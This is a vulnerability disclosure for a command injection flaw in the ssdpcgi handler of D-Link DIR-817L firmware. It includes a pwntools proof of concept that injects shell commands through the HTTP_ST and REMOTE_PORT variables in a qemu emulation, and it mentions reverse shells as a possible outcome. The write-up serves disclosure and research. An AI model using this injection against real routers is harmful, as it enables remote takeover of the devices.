# D-Link DIR-817L has a remote arbitrary command execution vulnerability in ssdpcgi

Affected versions: Firmware version <= Firmware v1.04B01

The program obtains environment variable parameters through `getenv`, and only filters backquote characters, without effectively restricting other special symbols that may trigger command execution. An attacker can construct a string similar to `ssdp:all+command` to inject malicious content into the parameters passed to the `lxmldbc_system` function. Because the function uses `sprintf` to splice the command string and executes it through `system`, it eventually leads to a command injection vulnerability, which allows an attacker to achieve remote code execution. This can then achieve malicious attacks such as rebound shells.

![image-20250701183716269](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250701183716269.png)

![image-20250701184135375](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250701184135375.png)

![image-20250701184218430](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250701184218430.png)



POC

```
from pwn import*
context.terminal = ['gnome-terminal', '--', 'bash', '-c']
context.arch='mips'
context.os='linux'
context.endian = 'big'
context.log_level = 'debug'
def bug():
    gdb.attach(target=("localhost", 8888), exe="./htdocs/cgibin",
               gdbscript="""
               b *0x40E210\n    
               c\n
               """)
    pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')


#cmd=input("command:")
pay=cyclic(0x100)
print(pay)
post_content = "Thir0th=AGRiot"
p = process(f'''
qemu-mips -L . \
  -0 "ssdpcgi" \
  -E HTTP_ST="ssdp:all;ls>" \
  -E REMOTE_ADDR="{pay}" \
  -E REMOTE_PORT=";ls;" \
  -E SERVER_ID="router" \
  -g 8888 \
  ./htdocs/cgibin ssdpcgi
''',shell=True)
bug()


p.send(post_content)







inter()
```

successfully executed

![image-20250719141248661](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250719141248661.png)
